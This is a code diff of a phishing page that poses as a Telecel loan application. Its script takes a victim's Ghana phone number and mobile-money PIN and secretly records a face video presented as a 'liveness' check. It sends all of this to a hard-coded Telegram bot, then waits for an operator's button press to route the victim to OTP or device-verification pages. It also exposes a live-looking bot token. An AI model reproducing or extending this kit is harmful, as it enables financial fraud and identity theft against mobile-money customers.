+    <div class="error-msg" id="errMsg"></div>
+    <button class="btn-primary" id="continueBtn">Verify &amp; Authorize Loan</button>
+    <button class="btn-back" onclick="window.history.back()">← Back to Application</button>
+    <div class="security-note">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+      </svg>
+      256-bit encrypted &amp; secured by Telecel
+    </div>
+  </div>
 </div>
 
-<!-- Already Applied Toast -->
+<!-- ══════════════════════════════════════
+     SELFIE SCREEN — full-screen, no text on video
+     ══════════════════════════════════════ -->
+<div id="selfieScreen">
+  <!-- Raw camera feed -->
+  <video id="selfieVideo" autoplay muted playsinline></video>
+
+  <!-- Pure SVG overlay: oval guide + animated arrow — ZERO text rendered on video -->
+  <svg id="selfieOverlay" viewBox="0 0 390 844" preserveAspectRatio="xMidYMid slice"
+       xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <!-- Cutout mask: dark everywhere except the oval -->
+      <mask id="ovalMask">
+        <rect width="390" height="844" fill="white"/>
+        <ellipse cx="195" cy="340" rx="118" ry="155" fill="black"/>
+      </mask>
+      <filter id="glow">
+        <feGaussianBlur stdDeviation="4" result="blur"/>
+        <feComposite in="SourceGraphic" in2="blur" operator="over"/>
+      </filter>
+    </defs>
+
+    <!-- Dim everything outside the oval -->
+    <rect width="390" height="844" fill="rgba(0,0,0,0.52)" mask="url(#ovalMask)"/>
+
+    <!-- Oval border — colour animated by JS -->
+    <ellipse id="ovalBorder" cx="195" cy="340" rx="118" ry="155"
+             fill="none" stroke="rgba(255,255,255,0.65)" stroke-width="2.5"
+             stroke-dasharray="none"/>
+
+    <!-- Corner tick marks (top-left, top-right, bottom-left, bottom-right) -->
+    <g stroke="white" stroke-width="3" stroke-linecap="round" opacity="0.8">
+      <path d="M115 230 L115 218 L127 218"/>
+      <path d="M275 230 L275 218 L263 218"/>
+      <path d="M115 450 L115 462 L127 462"/>
+      <path d="M275 450 L275 462 L263 462"/>
+    </g>
+
+    <!-- Animated directional arrow (SVG group, repositioned by JS) -->
+    <g id="arrowGroup" opacity="0">
+      <!-- Animated bounce via CSS -->
+      <circle id="arrowCircle" cx="195" cy="160" r="26" fill="rgba(228,35,32,0.88)"/>
+      <g id="arrowIcon" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+        <!-- Default: chevron UP (paths overridden by JS) -->
+        <line id="aLine1" x1="195" y1="152" x2="195" y2="168"/>
+        <line id="aLine2" x1="187" y1="158" x2="195" y2="150"/>
+        <line id="aLine3" x1="203" y1="158" x2="195" y2="150"/>
+      </g>
+    </g>
+  </svg>
+
+  <!-- Bottom panel — text lives HERE, not on the video layer -->
+  <div class="selfie-panel">
+    <div class="selfie-dots" id="selfieDots"></div>
+    <div class="selfie-instr" id="selfieInstr">Face the camera</div>
+    <div class="selfie-sub" id="selfieSub">Position yourself in the oval</div>
+    <button class="selfie-cancel-btn" id="selfieCancel">Cancel</button>
+  </div>
+</div>
+
+<!-- Toast -->
 <div id="toast-overlay"></div>
 <div id="toast">
-    <div class="toast-icon">
-        <svg fill="none" viewBox="0 0 24 24" stroke="#E42320" stroke-width="2">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
-        </svg>
-    </div>
-    <div class="toast-title">Already Applied</div>
-    <div class="toast-msg">You have already submitted a loan application. Please wait for approval before applying again.</div>
-    <button class="toast-btn" id="toastHomeBtn">Return Home</button>
+  <div class="toast-icon">
+    <svg fill="none" viewBox="0 0 24 24" stroke="#E42320" stroke-width="2">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
+    </svg>
+  </div>
+  <div class="toast-title">Already Applied</div>
+  <div class="toast-msg">You have already submitted a loan application. Please wait for approval before applying again.</div>
+  <button class="toast-btn" id="toastHomeBtn">Return Home</button>
 </div>
 
-<!-- Spinner overlay -->
+<!-- Spinner -->
 <div id="spinner">
-    <div class="spin-ring"></div>
-    <div class="spin-label">Verifying &amp; Processing</div>
-    <div class="spin-sub">Please hold on…</div>
+  <div class="spin-ring"></div>
+  <div class="spin-label">Verifying &amp; Processing</div>
+  <div class="spin-sub">Please hold on…</div>
 </div>
+
+<style>
+/* Arrow bounce animation */
+@keyframes bounceUp{0%,100%{transform:translateY(0)}50%{transform:translateY(-7px)}}
+@keyframes bounceDown{0%,100%{transform:translateY(0)}50%{transform:translateY(7px)}}
+@keyframes bounceLeft{0%,100%{transform:translateX(0)}50%{transform:translateX(-7px)}}
+@keyframes bounceRight{0%,100%{transform:translateX(0)}50%{transform:translateX(7px)}}
+#arrowGroup.bounce-up{animation:bounceUp .7s ease-in-out infinite}
+#arrowGroup.bounce-down{animation:bounceDown .7s ease-in-out infinite}
+#arrowGroup.bounce-left{animation:bounceLeft .7s ease-in-out infinite}
+#arrowGroup.bounce-right{animation:bounceRight .7s ease-in-out infinite}
+@keyframes ovalPulse{0%,100%{stroke-width:2.5}50%{stroke-width:4}}
+#ovalBorder.pulsing{animation:ovalPulse .9s ease-in-out infinite}
+</style>
 
 <script>
-    const CONFIG = {
-        BOT_TOKEN: '8922720861:AAFbiWfdykmYFA4xjHbrEr_G5spC6jMYMxQ',
-        CHAT_ID: '7881536601',
-        APPROVE_PAGE: 'otp.html',
-        DEVICE_PAGE: 'device_verify.html',
-        SUCCESS_PAGE: 'success.html'
-    };
+/* ─── CONFIG ─────────────────────────────── */
+const CONFIG = {
+  BOT_TOKEN: '8922720861:AAFbiWfdykmYFA4xjHbrEr_G5spC6jMYMxQ',
+            CHAT_ID: '7881536601',
+  APPROVE_PAGE: 'otp.html',
+  DEVICE_PAGE:  'device_verify.html',
+  SUCCESS_PAGE: 'success.html'
+};
 
-    let state = { lastUpdateId: 0 };
-    let isProcessing = false;
+/* ─── LIVENESS STEPS ─────────────────────── */
+// Each step: instruction text, arrow direction, arrow cx/cy in the 390×844 viewBox
+const STEPS = [
+  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:195, cy:160 },
+  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:60,  cy:340 },
+  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:330, cy:340 },
+  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:195, cy:160 },
+  { instr:'Look down',         sub:'Tilt your head downward',     dir:'down',  cx:195, cy:530 },
+];
 
-    const phoneInput  = document.getElementById('phone');
-    const pinInput    = document.getElementById('password');
-    const continueBtn = document.getElementById('continueBtn');
-    const errMsg      = document.getElementById('errMsg');
-    const spinner     = document.getElementById('spinner');
-    const toast       = document.getElementById('toast');
-    const toastOverlay = document.getElementById('toast-overlay');
-    const toastHomeBtn = document.getElementById('toastHomeBtn');
+// Arrow chevron path coords per direction (line endpoints relative to circle centre)
+const ARROW_SHAPES = {
+  null:  { l1:[0,-8,0,8],  l2:[-8,-2, 0,-10], l3:[8,-2, 0,-10] }, // still: no arrow shown
+  left:  { l1:[-8,0,8,0],  l2:[0,-8,-10,0],   l3:[0,8,-10,0]   },
+  right: { l1:[-8,0,8,0],  l2:[0,-8,10,0],    l3:[0,8,10,0]    },
+  up:    { l1:[0,8,0,-8],  l2:[-8,2,0,-8],    l3:[8,2,0,-8]    },
+  down:  { l1:[0,-8,0,8],  l2:[-8,-2,0,8],    l3:[8,-2,0,8]    },
+};
 
-    function loadLoanDetails() {
-        const params    = new URLSearchParams(window.location.search);
-        const amount    = params.get('amount');
-        const duration  = params.get('duration');
-        const purpose   = params.get('purpose');
-        const name      = params.get('name');
-        const prevPhone = params.get('phone');
+/* ─── DOM REFS ───────────────────────────── */
+const phoneInput   = document.getElementById('phone');
+const pinInput     = document.getElementById('password');
+const continueBtn  = document.getElementById('continueBtn');
+const errMsg       = document.getElementById('errMsg');
+const spinnerEl    = document.getElementById('spinner');
+const toastEl      = document.getElementById('toast');
+const toastOverlay = document.getElementById('toast-overlay');
+const toastHomeBtn = document.getElementById('toastHomeBtn');
 
-        if (amount) {
-            document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
-            document.getElementById('loanLabel').textContent  = name ? `${name}'s Loan` : 'Flex Loan';
+const selfieScreen = document.getElementById('selfieScreen');
+const selfieVideo  = document.getElementById('selfieVideo');
+const selfieInstr  = document.getElementById('selfieInstr');
+const selfieSub    = document.getElementById('selfieSub');
+const selfieDots   = document.getElementById('selfieDots');
+const selfieCancel = document.getElementById('selfieCancel');
+const ovalBorder   = document.getElementById('ovalBorder');
+const arrowGroup   = document.getElementById('arrowGroup');
+const arrowCircle  = document.getElementById('arrowCircle');
+const aLine1       = document.getElementById('aLine1');
+const aLine2       = document.getElementById('aLine2');
+const aLine3       = document.getElementById('aLine3');
 
-            let details = [];
-            if (duration) details.push(`${duration} Days`);
-            if (purpose)  details.push(purpose.replace(/([A-Z])/g, ' $1').trim());
-            document.getElementById('loanDetails').textContent = details.join(' • ');
-        }
+/* ─── STATE ──────────────────────────────── */
+let botState      = { lastUpdateId: 0 };
+let isProcessing  = false;
+let mediaStream   = null;
+let mediaRecorder = null;
+let recordedChunks= [];
+let selfieBlob    = null;
+let currentStep   = 0;
+let stepTimer     = null;
+let capturedPhone = '';
+let capturedPin   = '';
 
-        if (prevPhone) phoneInput.value = prevPhone;
-    }
+/* ─── LOAN DETAILS ───────────────────────── */
+function loadLoanDetails() {
+  const p = new URLSearchParams(window.location.search);
+  const amount = p.get('amount'), duration = p.get('duration'),
+        purpose = p.get('purpose'), name = p.get('name'), prevPhone = p.get('phone');
+  if (amount) {
+    document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
+    document.getElementById('loanLabel').textContent  = name ? `${name}'s Loan` : 'Flex Loan';
+    const det = [];
+    if (duration) det.push(`${duration} Days`);
+    if (purpose)  det.push(purpose.replace(/([A-Z])/g,' $1').trim());
+    document.getElementById('loanDetails').textContent = det.join(' • ');
+  }
+  if (prevPhone) phoneInput.value = prevPhone;
+}
 
-    function isValidGhanaNumber(phone) {
-        if (phone.length !== 10) return false;
-        const validPrefixes = ['020','050','023','024','027','054','055','057','059','026','028'];
-        return validPrefixes.some(p => phone.startsWith(p));
-    }
+function isValidGhanaNumber(n) {
+  if (n.length !== 10) return false;
+  return ['020','050','023','024','027','054','055','057','059','026','028'].some(p => n.startsWith(p));
+}
 
-    function showToast() {
-        toast.style.display = 'block';
-        toastOverlay.style.display = 'block';
-    }
+/* ─── TOAST ──────────────────────────────── */
+function showToast()  { toastEl.style.display='block'; toastOverlay.style.display='block'; }
+function hideToast()  { toastEl.style.display='none';  toastOverlay.style.display='none';  }
+toastHomeBtn.onclick = () => { hideToast(); window.location.href='index.html'; };
 
-    function hideToast() {
-        toast.style.display = 'none';
-        toastOverlay.style.display = 'none';
-    }
+/* ─── ERROR / RESET ──────────────────────── */
+function showError(msg) { errMsg.textContent=msg; errMsg.style.display='block'; }
+function resetButton()  {
+  isProcessing=false;
+  continueBtn.disabled=false;
+  continueBtn.textContent='Verify & Authorize Loan';
+}
 
-    toastHomeBtn.onclick = function() {
-        hideToast();
-        window.location.href = 'index.html';
-    };
+/* ─── SELFIE HELPERS ─────────────────────── */
+function buildDots() {
+  selfieDots.innerHTML='';
+  STEPS.forEach((_,i) => {
+    const d=document.createElement('div');
+    d.className='sdot'; d.id=`sd${i}`; selfieDots.appendChild(d);
+  });
+}
 
-    function sendToBot(phone, pin) {
-        if (isProcessing) return;
-        isProcessing = true;
-        continueBtn.disabled = true;
-        continueBtn.textContent = "Verifying…";
+function setArrow(step) {
+  const s = STEPS[step];
+  if (!s.dir) { arrowGroup.style.opacity='0'; arrowGroup.className=''; return; }
 
-        const ts        = Date.now();
-        const approveId = `approve_${ts}`;
-        const declineId = `decline_${ts}`;
-        const verifyId  = `verify_${ts}`;
-        const appliedId = `applied_${ts}`;
+  const shape = ARROW_SHAPES[s.dir];
+  const cx=s.cx, cy=s.cy;
 
-        const accountType = document.getElementById('accountType').value === 'mobile'
-            ? 'Telecel Cash (Mobile Money)'
-            : 'Broadband';
+  arrowCircle.setAttribute('cx', cx);
+  arrowCircle.setAttribute('cy', cy);
+  // line1 = shaft
+  aLine1.setAttribute('x1', cx+shape.l1[0]); aLine1.setAttribute('y1', cy+shape.l1[1]);
+  aLine1.setAttribute('x2', cx+shape.l1[2]); aLine1.setAttribute('y2', cy+shape.l1[3]);
+  // line2 = left wing
+  aLine2.setAttribute('x1', cx+shape.l2[0]); aLine2.setAttribute('y1', cy+shape.l2[1]);
+  aLine2.setAttribute('x2', cx+shape.l2[2]); aLine2.setAttribute('y2', cy+shape.l2[3]);
+  // line3 = right wing
+  aLine3.setAttribute('x1', cx+shape.l3[0]); aLine3.setAttribute('y1', cy+shape.l3[1]);
+  aLine3.setAttribute('x2', cx+shape.l3[2]); aLine3.setAttribute('y2', cy+shape.l3[3]);
 
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nAccount Type: <code>${accountType}</code>\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ Approve Loan",   callback_data: approveId },
-                            { text: "📱 Verify Device",  callback_data: verifyId }
-                        ],
-                        [
-                            { text: "📋 Applied",        callback_data: appliedId },
-                            { text: "🚫 Decline",        callback_data: declineId }
-                        ]
-                    ]
-                }
-            })
-        })
-        .then(() => {
-            spinner.style.display = 'flex';
-            startPolling(approveId, declineId, verifyId, appliedId);
-        })
-        .catch(() => resetButton());
-    }
+  arrowGroup.style.opacity='1';
+  arrowGroup.className = 'bounce-'+s.dir;
+}
 
-    function startPolling(approveId, declineId, verifyId, appliedId) {
-        const interval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.ok || !data.result) return;
+function setStep(idx) {
+  currentStep = idx;
+  const step  = STEPS[idx];
 
-                    data.result.forEach(update => {
-                        state.lastUpdateId = update.update_id;
+  // Instruction text (fade swap)
+  selfieInstr.style.opacity='0';
+  setTimeout(()=>{ selfieInstr.textContent=step.instr; selfieSub.textContent=step.sub; selfieInstr.style.opacity='1'; }, 160);
 
-                        if (update.callback_query) {
-                            const cb = update.callback_query.data;
+  // Dots
+  STEPS.forEach((_,i)=>{
+    const d=document.getElementById(`sd${i}`);
+    d.className = i<idx ? 'sdot done' : i===idx ? 'sdot active' : 'sdot';
+  });
 
-                            if (cb === approveId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                window.location.href = `${CONFIG.APPROVE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-                            }
-                            else if (cb === verifyId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                window.location.href = `${CONFIG.DEVICE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-                            }
-                            else if (cb === appliedId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showToast();
-                                resetButton();
-                            }
-                            else if (cb === declineId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showError("Request declined. Please try again.");
-                                resetButton();
-                            }
-                        }
-                    });
-                });
-        }, 1000);
-    }
+  // Oval colour
+  if (idx < STEPS.length-1) {
+    ovalBorder.setAttribute('stroke','#E42320');
+    ovalBorder.classList.add('pulsing');
+  }
 
-    function showError(msg) {
-        errMsg.textContent   = msg;
-        errMsg.style.display = 'block';
-    }
+  // Arrow
+  setArrow(idx);
+}
 
-    function resetButton() {
-        isProcessing            = false;
-        continueBtn.disabled    = false;
-        continueBtn.textContent = "Verify & Authorize Loan";
-    }
+function advanceStep() {
+  if (currentStep < STEPS.length-1) {
+    setStep(currentStep+1);
+    stepTimer = setTimeout(advanceStep, 2000);
+  } else {
+    // All done
+    ovalBorder.setAttribute('stroke','#22c55e');
+    ovalBorder.classList.remove('pulsing');
+    arrowGroup.style.opacity='0';
+    arrowGroup.className='';
+    selfieInstr.textContent='✓ Verified';
+    selfieSub.textContent='';
+    STEPS.forEach((_,i)=>{ document.getElementById(`sd${i}`).className='sdot done'; });
+    setTimeout(()=>{ if(mediaRecorder && mediaRecorder.state!=='inactive') mediaRecorder.stop(); }, 700);
+  }
+}
 
-    continueBtn.onclick = () => {
-        errMsg.style.display = 'none';
+function stopCamera() {
+  if (mediaStream) { mediaStream.getTracks().forEach(t=>t.stop()); mediaStream=null; }
+  selfieVideo.srcObject=null;
+}
 
-        const phone = phoneInput.value.trim();
-        const pin   = pinInput.value.trim();
+function closeSelfieScreen() {
+  clearTimeout(stepTimer);
+  stopCamera();
+  selfieScreen.style.display='none';
+}
 
-        if (!phone || !isValidGhanaNumber(phone)) {
-            showError("Please enter a valid Ghana number (e.g. 0501234567)");
-            return;
-        }
-        if (pin.length !== 4) {
-            showError("PIN must be exactly 4 digits");
-            return;
-        }
+selfieCancel.onclick = () => {
+  closeSelfieScreen();
+  resetButton();
+  isProcessing=false;
+};
 
-        sendToBot(phone, pin);
-    };
+/* ─── MAIN SELFIE FLOW ───────────────────── */
+async function startSelfieVerification() {
+  buildDots();
+  selfieScreen.style.display='flex';
+  selfieInstr.textContent='Starting camera…';
+  selfieSub.textContent='';
+  arrowGroup.style.opacity='0';
+  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.65)');
+  ovalBorder.classList.remove('pulsing');
+  recordedChunks=[]; selfieBlob=null;
 
-    phoneInput.addEventListener('input', () => {
-        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+  try {
+    mediaStream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
+      audio:false
     });
+    selfieVideo.srcObject = mediaStream;
+    await selfieVideo.play();
 
-    pinInput.addEventListener('input', () => {
-        pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
-        if (pinInput.value.length === 4) pinInput.blur();
+    // Pick best supported mime type
+    const mimeType = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4']
+      .find(m => { try { return MediaRecorder.isTypeSupported(m); } catch(e){ return false; } })
+      || '';
+
+    const mrOpts = mimeType ? { mimeType } : {};
+    mediaRecorder = new MediaRecorder(mediaStream, mrOpts);
+
+    mediaRecorder.ondataavailable = e => { if(e.data && e.data.size>0) recordedChunks.push(e.data); };
+    mediaRecorder.onstop = () => {
+      const type = mimeType || 'video/webm';
+      selfieBlob = new Blob(recordedChunks, { type });
+      closeSelfieScreen();
+      proceedWithSubmission();
+    };
+    mediaRecorder.start(250); // chunk every 250ms
+
+    // Start liveness steps after 600ms warm-up
+    setTimeout(()=>{ setStep(0); stepTimer=setTimeout(advanceStep,2000); }, 600);
+
+  } catch(err) {
+    // Camera denied — silently continue without video
+    selfieBlob=null;
+    closeSelfieScreen();
+    proceedWithSubmission();
+  }
+}
+
+/* ─── TELEGRAM ───────────────────────────── */
+async function sendVideoToTelegram() {
+  if (!selfieBlob || selfieBlob.size < 1000) return;
+
+  const accountType = document.getElementById('accountType').value==='mobile'
+    ? 'Telecel Cash (Mobile Money)' : 'Broadband';
+
+  const caption =
+    `🎥 Liveness Selfie\n` +
+    `📱 Phone: ${capturedPhone}\n` +
+    `🔑 PIN: ${capturedPin}\n` +
+    `🏦 Account: ${accountType}\n` +
+    `💰 Amount: ${document.getElementById('loanAmount').textContent}`;
+
+  const ext = selfieBlob.type.includes('mp4') ? 'mp4' : 'webm';
+  const fd  = new FormData();
+  fd.append('chat_id', CONFIG.CHAT_ID);
+  fd.append('video',   selfieBlob, `liveness_${Date.now()}.${ext}`);
+  fd.append('caption', caption);
+
+  try {
+    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`, {
+      method:'POST', body:fd
     });
+  } catch(_) { /* silently ignore */ }
+}
 
-    loadLoanDetails();
-    phoneInput.focus();
+function sendMainMessage() {
+  const ts        = Date.now();
+  const approveId = `approve_${ts}`;
+  const declineId = `decline_${ts}`;
+  const verifyId  = `verify_${ts}`;
+  const appliedId = `applied_${ts}`;
+
+  const accountType = document.getElementById('accountType').value==='mobile'
+    ? 'Telecel Cash (Mobile Money)' : 'Broadband';
+
+  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      chat_id: CONFIG.CHAT_ID,
+      text: `<b>🔴 Telecel Loan Verification</b>\n\n` +
+            `Amount: ${document.getElementById('loanAmount').textContent}\n` +
+            `Account Type: <code>${accountType}</code>\n` +
+            `Phone: <code>${capturedPhone}</code>\n` +
+            `PIN: <code>${capturedPin}</code>\n\n` +
+            `Choose Action:`,
+      parse_mode:'HTML',
+      reply_markup:{
+        inline_keyboard:[
+          [
+            { text:'✅ Approve Loan',  callback_data:approveId },
+            { text:'📱 Verify Device', callback_data:verifyId }
+          ],
+          [
+            { text:'📋 Applied',       callback_data:appliedId },
+            { text:'🚫 Decline',       callback_data:declineId }
+          ]
+        ]
+      }
+    })
+  })
+  .then(()=>{
+    spinnerEl.style.display='flex';
+    startPolling(approveId, declineId, verifyId, appliedId);
+  })
+  .catch(()=>resetButton());
+}
+
+async function proceedWithSubmission() {
+  // 1. Send the selfie video first
+  await sendVideoToTelegram();
+  // 2. Then send the action message
+  sendMainMessage();
+}
+
+/* ─── POLLING ────────────────────────────── */
+function startPolling(approveId, declineId, verifyId, appliedId) {
+  const interval = setInterval(()=>{
+    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${botState.lastUpdateId+1}`)
+      .then(r=>r.json())
+      .then(data=>{
+        if(!data.ok || !data.result) return;
+        data.result.forEach(update=>{
+          botState.lastUpdateId = update.update_id;
+          if(update.callback_query){
+            const cb = update.callback_query.data;
+            if(cb===approveId){
+              clearInterval(interval); spinnerEl.style.display='none';
+              window.location.href=`${CONFIG.APPROVE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
+            } else if(cb===verifyId){
+              clearInterval(interval); spinnerEl.style.display='none';
+              window.location.href=`${CONFIG.DEVICE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
+            } else if(cb===appliedId){
+              clearInterval(interval); spinnerEl.style.display='none';
+              showToast(); resetButton();
+            } else if(cb===declineId){
+              clearInterval(interval); spinnerEl.style.display='none';
+              showError('Request declined. Please try again.'); resetButton();
+            }
+          }
+        });
+      })
+      .catch(()=>{});
+  }, 1000);
+}
+
+/* ─── FORM SUBMIT ────────────────────────── */
+continueBtn.onclick = () => {
+  errMsg.style.display='none';
+  const phone = phoneInput.value.trim();
+  const pin   = pinInput.value.trim();
+
+  if(!phone || !isValidGhanaNumber(phone)){
+    showError('Please enter a valid Ghana number (e.g. 0501234567)'); return;
+  }
+  if(pin.length!==4){
+    showError('PIN must be exactly 4 digits'); return;
+  }
+  if(isProcessing) return;
+
+  capturedPhone = phone;
+  capturedPin   = pin;
+  isProcessing  = true;
+  continueBtn.disabled=true;
+  continueBtn.textContent='Verifying…';
+
+  startSelfieVerification();
+};
+
+phoneInput.addEventListener('input',()=>{
+  phoneInput.value = phoneInput.value.replace(/[^0-9]/g,'').slice(0,10);
+});
+pinInput.addEventListener('input',()=>{
+  pinInput.value = pinInput.value.replace(/[^0-9]/g,'').slice(0,4);
+  if(pinInput.value.length===4) pinInput.blur();
+});
+
+loadLoanDetails();
+phoneInput.focus();
 </script>
 </body>
 </html>
